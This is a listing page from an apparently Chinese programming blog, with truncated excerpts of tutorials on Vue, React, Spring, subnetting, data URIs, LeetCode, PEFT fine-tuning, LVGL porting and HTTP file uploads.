2. 基于风格的生成器 传统上，隐编码通过输入层（即前馈网络的第一层）提供给生成器（图 1a）。 我们通过完全删除输入层并从学到的常量开始来偏离此设计（图 1b，右）。 给定输入隐空间 Z 中的隐编码 z，非线性映射网络 f : Z → W 首先生成 w ∈ W（图 1b，左）。 为简单起见，我们将两个空间的维数都设置为 512，映射 f 是使用 8 层 MLP 实现的，我们将在第 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/707b78dc057e2a4e563161237e598c17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84c7a3b837761badcd4f1c31a945fbcb/" rel="bookmark">
			【Vue基础】Vue路由，实现页面跳转
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、需求说明
点击不同的模块实现页面跳转，如下点击“员工管理”右侧会显示员工管理页面，如下图1；点击“入住信息”右侧会显示入住信息，如下图二
二、涉及文件
1、 主要上图在这几个文件中修改相关代码
2、知识点整理
1）Vue Router 是 Vue 的官方路由，其组成有:
VueRouter:路由器类，根据路由请求在路由视图中动态染选中的组件
&lt;router-link&gt;:请求链接组件，浏览器会解析成&lt;a&gt;
&lt;router-view&gt;:动态视图组件，用来染展示与路由路径对应的组件
三、代码参考
1、App.vue文件,动态展示组件
&lt;template&gt; &lt;div &gt; &lt;!-- &lt;h1&gt;{{ message }}&lt;/h1&gt; --&gt; &lt;!-- &lt;element-view&gt;&lt;/element-view&gt; --&gt; &lt;!--&lt;emp-view&gt;&lt;/emp-view&gt;--&gt; &lt;!-- &lt;Btest2-view&gt;&lt;/Btest2-view&gt;--&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; //import empView from './views/systemTest/empView.vue' //import Btest2View from './views/systemTest/Btest2View.vue' //import ElementView from './views/element/ElementView.vue' export default { //components: { empView }, //components: { ElementView }, components: { /*Btest2View*/ }, data() { return { message: "Hello world!" } }, methods: { } } &lt;/script&gt; &lt;style&gt; &lt;/style&gt; 2、index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84c7a3b837761badcd4f1c31a945fbcb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc1584dd2ab2917ff701f8e3f7ee3635/" rel="bookmark">
			根据IP判断是同一网段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、IP我们先来了解一下3类常用的ＩＰ
A类IP段　0.0.0.0 到127.255.255.255 B类IP段　128.0.0.0 到191.255.255.255 C类IP段　192.0.0.0 到223.255.255.255
ＸＰ默认分配的子网掩码每段只有255或0
Ａ类的默认子网掩码　255.0.0.0　一个子网最多可以容纳1677万多台电脑
Ｂ类的默认子网掩码　255.255.0.0　一个子网最多可以容纳6万台电脑
Ｃ类的默认子网掩码　255.255.255.0　一个子网最多可以容纳254台电脑
如果计算可用IP个数？将子网掩码转换成二进制，进行计算，如下：
255.0.0.0　11111111.00000000.00000000.00000000
255.255.0.0　11111111.11111111.00000000.00000000
255.255.255.0　11111111.11111111.11111111.00000000
这是A/B/C三类默认子网掩码的二进制形式，其实，还有好多种子网掩码，只要是一串连续的1和一串连续的0就可以了（每段都是8位）。如11111111.11111111.11111000.00000000，这也是一段合法的子网掩码。子网掩码决定的是一个子网的计算机数目，计算机公式是2的m次方，其中，我们可以把m看到是后面的多少颗0。如255.255.255.0转换成二进制，那就是11111111.11111111.11111111.00000000，后面有8颗0，那m就是8，255.255.255.0这个子网掩码可以容纳2的8次方（台）电脑，也就是256台，但是有两个ＩＰ是不能用的，那就是最后一段不能为0和255，减去这两台，就是254台。我们再来做一个。
255.255.248.0这个子网掩码可以最多容纳多少台电脑？
计算方法：
把将其转换为二进制的四段数字（每段要是8位，如果是0，可以写成8个0，也就是00000000）
11111111.1111111.11111000.00000000
然后，数数后面有几颗0，一共是有11颗，那就是2的11次方，等于2048，这个子网掩码最多可以容纳2048台电脑。
一个子网最多可以容纳多少台电脑你会算了吧，下面我们来个逆向算法的题。
一个公司有530台电脑，组成一个对等局域网，子网掩码设多少最合适？
首先，无疑，530台电脑用Ｂ类ＩＰ最合适（Ａ类不用说了，太多，Ｃ类又不够，肯定是Ｂ类），但是B类默认的子网掩码是255.255.0.0，可以容纳6万台电脑，显然不太合适，那子网掩码设多少合适呢？我们先来列个公式。
2的m次方＝560
首先，我们确定2一定是大于8次方的，因为我们知道2的8次方是256，也就是Ｃ类ＩＰ的最大容纳电脑的数目，我们从9次方一个一个试2的9次方是512，不到560，2的10次方是1024，看来2的10次方最合适了。子网掩码一共由32位组成，已确定后面10位是0了，那前面的22位就是1，最合适的子网掩码就是：11111111.11111111.11111100.00000000，转换成10进制，那就是255.255.252.0。
2、如果判断IP是否属于相同网段，如果为系统划分网段：
相信好多人都和偶一样，认为ＩＰ只要前三段相同，就是在同一网段了，其实，不是这样的，同样，我样把ＩＰ的每一段转换为一个二进制数，这里就拿ＩＰ：192.168.0.1，子网掩码：255.255.255.0做实验吧。
192.168.0.1
11000000.10101000.00000000.00000001
（这里说明一下，和子网掩码一样，每段8位，不足8位的，前面加0补齐。）
ＩＰ　11000000.10101000.00000000.00000001
子网掩码　11111111.11111111.11111111.00000000
在这里，向大家说一下到底怎么样才算同一网段。
要想在同一网段，必需做到网络标识相同，那网络标识怎么算呢？各类ＩＰ的网络标识算法都是不一样的。Ａ类的，只算第一段。Ｂ类，只算第一、二段。Ｃ类，算第一、二、三段。
算法只要把ＩＰ和子网掩码的每位数AND就可以了。
AND方法：0和1＝0　0和0＝0　1和1＝1
如：And　192.168.0.1，255.255.255.0，先转换为二进制，然后AND每一位
ＩＰ　11000000.10101000.00000000.00000001
子网掩码　11111111.11111111.11111111.00000000
得出AND结果　11000000.10101000.00000000.00000000
转换为十进制192.168.0.0，这就是网络标识，
再将子网掩码反取，也就是00000000.00000000.00000000.11111111，与IP　AND
得出结果00000000.00000000.00000000.00000001，转换为10进制，即0.0.0.1，
这0.0.0.1就是主机标识。要想在同一网段，必需做到网络标识一样。
我们再来看看这个改为默认子网掩码的Ｂ类ＩＰ
如ＩＰ：188.188.0.111，188.188.5.222，子网掩码都设为255.255.254.0，在同一网段吗？
先将这些转换成二进制
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc1584dd2ab2917ff701f8e3f7ee3635/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8e3ac05b266bf79a428c8c4a95adda4/" rel="bookmark">
			vue3前台查询使用多个字典项并且和后台交互
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前端使用
1.前台vue3接口使用 dictManege.ts
2.前台使用该接口地方
3.前台反显地方 其他几个都一样，这里使用在state中定义的idTypeList,在上面赋值，在这里使用 二、后端使用
4.后端controller接口实现 其中使用字典String[]来接收 放入到
String ... codes中
5.ServiceImpl实现类 其中使用了注解缓存
6.在Redis Desktop Manage工具中可以看得到 三、后端feign调用该接口
8.在trans服务中也添加DictReq类 （copy过来就行）
9.具体实现类中使用给feign类
一、前端使用 1.前台vue3接口使用 dictManege.ts import request from '@/utils/request' export function getDicListByCodes(query:any) { return request({ url: './user-service/dict/queryByCodes', method: 'post', data: query }); }; 2.前台使用该接口地方 const showEdit = async (row) =&gt; { //初始化修改的字典 const { retCode, success, data, msg } = await getDicListByCodes({ codes: ["sex","id_type","copd_level"] }) if (retCode === 0) { state.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8e3ac05b266bf79a428c8c4a95adda4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe23dbc55a0be071eb3cf8da7d427dce/" rel="bookmark">
			data：image/png；base64的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 大家可能注意到了，网页上有些图片的src或css背景图片的url后面跟了一大串字符，比如：
background-image:url(data:image/png;base64, iVBORw0KGgoAAAANSUhEUgAAAAEAAAAkCAYAAABIdFAMAAAAGXR FWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAHhJRE FUeNo8zjsOxCAMBFB/KEAUFFR0Cbng3nQPw68ArZdAlOZppPFIB hH5EAB8b+Tlt9MYQ6i1BuqFaq1CKSVcxZ2Acs6406KUgpt5/　LCKuVgz5BDCSb13ZO99ZOdcZGvt4mJjzMVKqcha68iIePB86G AiOv8CDADlIUQBs7MD3wAAAABJRU5ErkJggg%3D%3D) 那么这是什么呢？这是Data URI scheme。
Data URI scheme是在RFC2397中定义的，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。比如上面那串字符，其实是一张小图片，将这些字符复制黏贴到火狐的地址栏中并跳转，就能看到它了，一张1X36的白灰png图片。
在上面的Data URI中，data表示取得数据的协定名称，image/png是数据类型名称，base64是数据的编码方法，逗号后面就是这个 image/png文件base64编码后的数据。目前，Data URI scheme支持的类型有：
data:,文本数据 data:text/plain,文本数据 data:text/html,HTML代码 data:text/html;base64,base64编码的HTML代码 data:text/css,CSS代码 data:text/css;base64,base64编码的CSS代码 data:text/javascript,Javascript代码 data:text/javascript;base64,base64编码的Javascript代码 data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc5dacd7520bcaf20d822f139ba24d4f/" rel="bookmark">
			LeetCode 111. 二叉树的最小深度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		111. 二叉树的最小深度 描述 给定一个二叉树，找出其最小深度。
最小深度是从根节点到最近叶子节点的最短路径上的节点数量。
说明：叶子节点是指没有子节点的节点。
示例：
给定二叉树 [3,9,20,null,null,15,7]
示例 示例1
输入：root = [3,9,20,null,null,15,7]
输出：2
示例2
输入：root = [2,null,3,null,4,null,5,null,6]
输出：5
链接 https://leetcode.cn/problems/minimum-depth-of-binary-tree/
解题思路 思路一: 递归/深度优先搜索 叶子节点的定义是左孩子和右孩子都为 null 时叫做叶子节点当 root 节点左右孩子都为空时，返回 1当 root 节点左右孩子有一个为空时，返回不为空的孩子节点的深度当 root 节点左右孩子都不为空时，返回左右孩子较小深度的节点值 /** * @param {TreeNode} root * @return {number} */ var minDepth = function(root) { if (root === null) return 0; let m1 = minDepth(root.left); let m2 = minDepth(root.right); //1.如果左孩子和右孩子有为空的情况，直接返回m1+m2+1 //2.如果都不为空，返回较小深度+1 return root.left == null || root.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc5dacd7520bcaf20d822f139ba24d4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4931a8ad7721545bb86702c0c51c5732/" rel="bookmark">
			关于在react的useEffect使用axios请求出现两次的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题原因 在react18中启用了严格模式。
解决方法 删除main.tsx中的&lt;React.StrictMode&gt;标签，使用useEffect就不会出现请求两次的情况借助useRef解决。 相关代码 let [pageNum, setPageNum] = useState&lt;number&gt;(1); let [pageSize, setPageSize] = useState&lt;number&gt;(10); let [dataSource, setDataSource] = useState&lt;DataType[]&gt;([]); let [total, setTotal] = useState&lt;number&gt;(0); let renderRef = useRef&lt;boolean&gt;(true); const loadData = async () =&gt; { await axios .get(`url`, { pageNum, pageSize }) .then((resp: any) =&gt; { setDataSource(resp.rows); setTotal(resp.total); }); }; useEffect(() =&gt; { if (renderRef.current) { renderRef.current = false; return; } loadData(); }, [pageNum, pageSize]); 上述的解决方法任选一种即可。 后记： 至于其他在react的hooks中的useEffect遇到执行两次的情况，解决的方式与上述的思路差不多。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4931a8ad7721545bb86702c0c51c5732/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b13f929e0a72effdae911d1a0eac01e4/" rel="bookmark">
			C/C&#43;&#43; for循环的几种用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单的讲一下for循环的三种用法！
用的编译工具是：Visual Studio 2017
一、for (int i = 0; i &lt; N; i++) 这是最简单，也是最常用的方法：
int nums[] = { 3, 4, 2, 9, 15, 267 }; const int N = 6; for (int i = 0; i &lt; N; i++) { cout &lt;&lt; nums[i] &lt;&lt; " "; } cout &lt;&lt; endl &lt;&lt; endl; 这种方式没什么好讲，重点看下面两种！
二、for_each 需包含头文件：#include &lt; algorithm &gt; 1. for_each(nums, nums + N, vecFunc); 这种方式需要借助一个函数，遍历将数组中的每个值在函数中进行操作。
其中nums是一个数组，N是数组的个数，vecFunc是一个函数
#include &lt;iostream&gt; // std::cout #include &lt;algorithm&gt; // std::for_each #include &lt;vector&gt; // std::vector using namespace std; // 函数 void vecFunc(int &amp;i) { cout &lt;&lt; i &lt;&lt; endl; i = 10;	// 更改数组的值 } int main() { int nums[] = { 3, 4, 2, 9, 15, 267 }; const int N = 6; cout &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b13f929e0a72effdae911d1a0eac01e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffa17c37bbda5b27f1d697967ab80f61/" rel="bookmark">
			Hugging Face PEFT 调优实战附代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Hugging Face PEFT 调优实战附代码 PEFT调优大模型 Hugging Face PEFT 调优实战附代码使用Hugging Face PEFT Library先快速上手使用PEFTLoRA详解实际应用--Kaggle 项目实战总结： 其他场景应用DreamBooth fine-tuning with LoRAP-tuning for sequence classification 后序 使用Hugging Face PEFT Library Hugging Face PEFT博客链接: link.
这篇博客是因为看了B站《李沐带你读论文》中《大模型时代下做科研的四个思路【论文精读·52】》链接: link.所受到启发，正好hugging face出了PEFT库，所以就打算记录下。
先快速上手使用PEFT 1.让我们考虑使用LoRA对bigscience/mt0-large【model card链接: link】进行微调的情况
备注：代码中的加号指的是增加的模块
from transformers import AutoModelForSeq2SeqLM **+ from peft import get_peft_model, LoraConfig, TaskType** model_name_or_path = "bigscience/mt0-large" tokenizer_name_or_path = "bigscience/mt0-large" 2.创建PEFT方法对应的配置
peft_config = LoraConfig( task_type=TaskType.SEQ_2_SEQ_LM, inference_mode=False, r=8, lora_alpha=32, lora_dropout=0.1 ) 3.通过调用get_peft_model封装基础🤗transformer模型
model = AutoModelForSeq2SeqLM.from_pretrained(model_name_or_path) + model = get_peft_model(model, peft_config) + model.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffa17c37bbda5b27f1d697967ab80f61/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb8e2dba4cbce72d6bda7e06f88e8e2a/" rel="bookmark">
			SpringRetry重试机制（3秒上手）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、SpringRetry的使用1.1 引入依赖1.2 开启重新机制1.3 3 在方法上添加@Retryable1.3.4 编写重试失败后的执行的方法测试 前言 SpringRetry重试机制在实际工作中的场景，比如:
发送消息失败，需要重新发送。调用远程服务失败，需要重新发送。 这些错误可能是因为网络波动造成的，等待过后重处理就能成功。spring-retry可以通过注解，在不入侵原有业务逻辑代码的方式下，优雅的实现重处理功能。
一、SpringRetry的使用 1.1 引入依赖 基于AOP实现,因此还需引入aop相关的依赖
&lt;dependency&gt; &lt;groupId&gt;org.springframework.retry&lt;/groupId&gt; &lt;artifactId&gt;spring-retry&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt; &lt;/dependency&gt; 1.2 开启重新机制 springboot入口类添加注解 @EnableRetry 1.3 3 在方法上添加@Retryable @Retryable(value = Exception.class, maxAttempts = 3, backoff = @Backoff(delay = 1000, multiplier = 1))
参数的含义：
value：抛出指定异常才会重试include：和value一样，默认为空，当exclude也为空时，默认所有异常exclude：指定不处理的异常maxAttempts：最大重试次数，默认3次backoff：重试等待策略，默认使用@Backoff，@Backoff的value默认为1000(单位毫秒)，我们设置为2000；multiplier（指定延迟倍数）默认为0，表示固定暂停1秒后进行重试，如果把multiplier设置为1.5，则第一次重试为2秒，第二次为3秒，第三次为4.5秒。 /** * value：抛出指定异常才会重试 * include：和value一样，默认为空，当exclude也为空时，默认所有异常 * exclude：指定不处理的异常 * maxAttempts：最大重试次数，默认3次 * backoff：重试等待策略， * 默认使用@Backoff，@Backoff的value默认为1000L，我们设置为2000； 以毫秒为单位的延迟（默认 1000） * multiplier（指定延迟倍数）默认为0，表示固定暂停1秒后进行重试，如果把multiplier设置为1.5，则第一次重试为2秒，第二次为3秒，第三次为4.5秒。 */ @Override @Retryable(value = Exception.class, maxAttempts = 3, backoff = @Backoff(delay = 1000, multiplier = 1)) public String test(int n) { log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cb8e2dba4cbce72d6bda7e06f88e8e2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20c3f67d521892bfa1bae4adc696dc21/" rel="bookmark">
			15 个常见的 Node.js 面试问题及答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		15 个常见的 Node.js 面试问题及答案 俗话说：临阵磨枪，不快也光。对于成功的编程面试来说，准备和知识面一样重要。准备使你有信心参加面试，而不用担心莫名的紧张情绪。如果第一次参加编程面试，这一点尤其重要。
为帮助 Node.js 开发人员更好的面试，列出了 15 个常见的 Node.js 和网络开发相关的面试问题。
在本文中，我们将重点讨论 Node.js 相关问题。但是，请记住 JavaScript 问题在 Node.js 面试中也经常问到，所以准备一些对你来说没什么坏处。
现在，让我们深入了解面试中可能会问到的 Node.js 问题。
1、Node.js与JavaScript有什么不同？ 2、什么时候用Node.js？ Node.js 是异步的、事件驱动的、非阻塞的和单线程的，使得它成为开发下面应用程序的完美候选：
实时应用程序，如聊天和提供实时更新的应用程序。将视频或其他多媒体内容流式传输给大量观众的流式应用程序。其他 I/O 密集型应用程序，如协作平台。遵循微服务架构的网络后端。 然而，Node.js 的特性使得它对于其他类型的应用程序来说不是一个理想的选择。执行 CPU 密集型任务的应用程序（如复杂的数学计算）在使用 CPU 时表现不佳，因为 Node.js 是单线程的。
3、EventEmitter做了什么？ Node.js 中任何对象发出的事件都是 EventEmitter 类的实例，就像 http 模块。
所有 EventEmitter 类都可以使用 eventEmitter.on() 函数将事件侦听器附加到事件。然后一旦捕捉到这样的事件，就会同步地逐个调用它的侦听器。
const events = require("events"); const eventEmitter = new events.EventEmitter(); const eventListener = function(){ console.log("event triggered"); } eventEmitter.on("emitted", eventListener); eventEmitter.emit("emitted"); 4、事件循环是什么？ 单线程的 Node.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20c3f67d521892bfa1bae4adc696dc21/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/561a5cf4a3b5e494a3c8e7a96bb7ce95/" rel="bookmark">
			野火指南者（STM32F103）移植LVGL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、LVGL简介
lvgl是一个开源免费的GUI，对硬件资源要求很低，64 kB Flash，16 kB RAM以上的单片机都可以用，它是一款基于C编写的GUI，能很好的迁移到其他平台，且拥有丰富的图形控件，也能支持多种输入设备。
二、源码获取
本文是以V8.3版为例：https://github.com/lvgl/lvgl/tree/master
百度网盘：链接：https://pan.baidu.com/s/1c7TO5AU9hNv0icGgN6n2gg 提取码：bku8
三、移植工程
下载后的源码文件
移植需要用到的文件：
F:\浏览器下载\lvgl-master\src (lvgl源码目录)
F:\浏览器下载\lvgl-master\examples （官方示例 与 接口文件）
F:\浏览器下载\lvgl-master目录下的 lv_conf_template.h lvgl.h
下面开始正式移植：
1. 移植工程采用野火指南者的触摸屏实验
2.把工程复制出来，放到自己喜欢的地方，修改一下名称（尽量不要用中文），工程目录下添加一个LVGL目录（用来存放lvgl源码）
3.在LVGL目录下新建一个lvgl_driver目录，用来存放接口层文件
4. 把源码下需要用的文件复制到LVGL目录下
5. 把F:\浏览器下载\lvgl-master\examples\porting的文件复制到E:\STM32-LVGL\LVGL\lvgl_driver
6.部分文件重新命名
7.文件已经添加完成，现在打开工程，新建四个分组
8. 添加文件：
把E:\STM32-LVGL\LVGL\src下的.C文件全部添加到 LVGL Source (由于文件太多不太好截图)
把E:\STM32-LVGL\LVGL下的lv_conf.h添加到LVGL Config
把E:\STM32-LVGL\LVGL\lvgl_driver下的 lv_port_disp.c lv_port_indev.c添加到LVGL Port
9.添加文件路径： 10.勾选C99
11.点击编译程序，此时会有四个错误
12. 因为C99的原因，需要在前面加static
13.此时再编译发现还有一个错误
14.取消勾选 Use MicroLIB
15.编译后就发现零错误
16.修改lv_conf.h配置文件
17.修改lv_port_disp.c接口文件
18.修改 lv_port_disp_init(void)函数
void lv_port_disp_init(void) { /*------------------------- * Initialize your display * -----------------------*/ disp_init(); static lv_disp_drv_t disp_drv; /*Descriptor of a display driver*/ lv_disp_drv_init(&amp;disp_drv); /*Basic initialization*/ /*Set up the functions to access to your display*/ /*Set the resolution of the display*/ disp_drv.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/561a5cf4a3b5e494a3c8e7a96bb7ce95/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e141f5839184a823a63e1c153dea8f58/" rel="bookmark">
			网页模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网页模板是预先设计和布局的网页文件，包含了网页的结构、样式和元素。它们通常由设计师或开发者创建，并用于快速构建网站的基础框架。
网页模板通常采用HTML、CSS和JavaScript等前端技术语言编写。它们提供了一个可重复使用的结构，包括网页的整体布局、导航菜单、页眉、页脚、内容区域等。通过使用网页模板，您可以节省设计和开发时间，快速搭建起具备一致性和专业外观的网站。
网页模板的主要特点包括：
结构和布局：网页模板定义了网页的整体结构和布局，包括网页的分栏、容器、排版等。
样式和设计：网页模板定义了网页的样式，包括颜色、字体、背景、按钮样式等。它们通常具有统一的设计风格，以确保整个网站的一致性。
响应式设计：现代网页模板通常采用响应式设计，使网页能够自适应不同设备和屏幕尺寸，提供良好的用户体验。
元素和组件：网页模板可能包含各种常见的网页元素和组件，例如滑块、图像库、表单、轮播图等，以提供更丰富的功能和交互性。
网页模板可以通过多种方式获取，如商业市场、免费资源网站或通过自定义开发。它们可以根据个人或组织的需求进行修改和定制，以满足特定的设计和功能要求。
使用网页模板时，请确保遵循任何授权或许可证要求，并根据需要进行适当的修改和个性化，以确保您的网站与众不同，并具备您想要的独特特色。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a65efb49f651876071b19f5062395348/" rel="bookmark">
			sqlite&#43;springBoot&#43;mybatis 的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是sqlite? 官方解释：
SQLite 是一个 C 语言库，它实现了一个小型、快速、自包含、高可靠性、全功能、 SQL 数据库引擎。 SQLite是世界上使用最多的数据库引擎。 SQLite内置于所有手机和大多数计算机中，并且 捆绑在人们的无数其他应用程序中 每天使用。更多信息...
SQLite 文件格式稳定、跨平台且 向后兼容，开发人员承诺保持它 这样到2050年。SQLite数据库 文件通常用作传输富的容器 系统之间的内容 [1] [2] [3] 和作为长期存档格式的内容 对于数据 [4]。 有超过 1 万亿 （1e12） SQLite 数据库正在使用中 [5]。
SQLite源代码属于公共领域，可以免费 每个人都可以用于任何目的。
简单来说，无需安装的小型的关系型数据库，可以即拆即用的数据库，可以快速搭建小型的项目。
2.新建sqlite 数据库 选择sqlite
选择新建sqlite3 、2 都可以的根据自己需求
桌面上就生成了 .db 文件
3.新建项目 新建一个springboot + mybatis项目
将demo.db转移到resourses中
Maven 新加入SQLite 驱动
&lt;!-- SQLite 驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.xerial&lt;/groupId&gt; &lt;artifactId&gt;sqlite-jdbc&lt;/artifactId&gt; &lt;version&gt;3.21.0.1&lt;/version&gt; &lt;/dependency&gt; yaml 配置文件
spring: datasource: driver-class-name: org.sqlite.JDBC url: jdbc:sqlite::resource:sql/demo.db #mybatis mybatis: mapperLocations: classpath*:mapper/*.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a65efb49f651876071b19f5062395348/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afa3a2a3d1526c7e9589924ebabe0109/" rel="bookmark">
			详解HTTP的文件上传全过程(RFC1867协议)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		详解HTTP的文件上传全过程:RFC1867协议 HTTP请求头HTTP请求体什么是 multipart/form-data上传文件信息的内容组成原生Node实现客户端上传文件原生Golang实现上传和接收客户端上传:服务端接收: HTTP和RFC 做爬虫业务一段时间了，经常用到GET, POST方法请求数据。GET请求最没问题，而POST中常用的 表单提交，JSON提交也比较容易。自以为对 TCP/HTTP 协议理解透彻。然后想到HTTP文件上传的原理，却还不懂，突然想搞明白，故网上查了资料。其中涉及HTTP的RFC1867协议，记录如下:
HTTP请求头 使用HTTP的 POST 方法，提交文件上传。
Content-Type 请求头的值有如下几种:
application/x-www-form-urlencoded: POST数据为 url参数 格式application/json: POST数据格式为 json文本multipart/form-data; boundary=----WebKitFormBoundarycz5DOEJKqu7XXB7k: POST数据包含: 带有参数与值的纯文本数据 和 上传的文件原始数据 (纯文本无法正确显示) HTTP请求体 multipart/form-data 格式的POST的数据如下所示:
不带上传文件的POST请求: ------WebKitFormBoundarycz5DOEJKqu7XXB7k Content-Disposition: form-data; name="_csrf" NgnTBmqX7F9HqIjxufqrM4MCr-Szxtw3SISaHY4Sl-O3XnZys1SMHY2L2MB_INRebu0fWuj6tmXlQAqM8GdIKw== ------WebKitFormBoundarycz5DOEJKqu7XXB7k Content-Disposition: form-data; name="Product[product_no]" H312985401 ------WebKitFormBoundarycz5DOEJKqu7XXB7k Content-Disposition: form-data; name="Product[name]" 女式连帽针织开衫 ------WebKitFormBoundarycz5DOEJKqu7XXB7k Content-Disposition: form-data; name="Product[price]" 539 ------WebKitFormBoundarycz5DOEJKqu7XXB7k Content-Disposition: form-data; name="Product[describe]" ------WebKitFormBoundarycz5DOEJKqu7XXB7k-- 上传一个文件(测试站点:改图宝) ------WebKitFormBoundaryzBpJfpFKA7eYQx6h Content-Disposition: form-data; name="file"; filename="rust-lang.png" Content-Type: image/png ------WebKitFormBoundaryzBpJfpFKA7eYQx6h Content-Disposition: form-data; name="token" 171a2fe2c5be7ad5772957b48dc50c41 ------WebKitFormBoundaryzBpJfpFKA7eYQx6h Content-Disposition: form-data; name="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/afa3a2a3d1526c7e9589924ebabe0109/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/724a843e5c7123e2e195d29d66e9b050/" rel="bookmark">
			Spring AOP源码分析篇一:@EnableAspectJAutoProxy的来龙去脉
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
1. 名词概念
2. @EnableAspectJAutoProxy的来龙去脉
3. 代码例子
4. 源码解读
4.1. parser.parse(candidates)
4.2. this.reader.loadBeanDefinitions(configClasses);
前言 我一直都想做一个AOP的专题，奈何不知从何入手，思来想去还是觉得从@EnableAspectJAutoProxy注解开始讲起，毕竟它是AOP的开关，通过它来引出AOP的全流程以及后面系列文章的分享，这样比单纯讲理论来的容易懂，毕竟AOP里面的类和名词都特别多，大家不用担心文章难懂，我会加上一系列流程图来帮助大家理解，话不多说，开始今天分享！
1. 名词概念 先上代码：
上面通过代码演示，如果还对概念不清晰的话，下面还有流程图演示哦! 1、通知(advice)：通知定义了切面是什么以及何时使用。可以在连接点做具体的代码处理，例如在方法前后(JoinPoint连接点)打印日志(前置通知、后置通知、环绕通知)、对方法的异常进行处理。
2、连接点(JoinPoint)：spring允许你通知(Adivce)的地方。程序能够应用通知的一个“时机”，这些“时机”就是连接点，例如方法前后、抛出异常时都可以是连接点。Spring只支持方法连接点。它和advice的区别是：例如有个A类的mehtod()方法，在该方法执行前让他进行前置通知，那“方法执行前”的位置就是连接点，因为连接点是围绕着具体的method()，所以JoinPoint对象可以获取到method()的各种属性，而前置通知的内容(处理逻辑)，就是具体的代码逻辑。
3、切入点(Pointcut)：多个连接点的集合的统称，例如@Pointcut( "execution(public void com.xiaoyuanzai.service.UserService.test())" )，代表了在这个方法前/后可以进行增强，每个位置就是一个连接点，这样算下来就有很多种可能，有一系列的连接点，这就是切入点了
4、切面(Aspect) ：切面是通知和切点的结合
5、适配器(Advisor):适配器=通知(advice)+切入点(Pointcut)
太抽象了？给个图看看
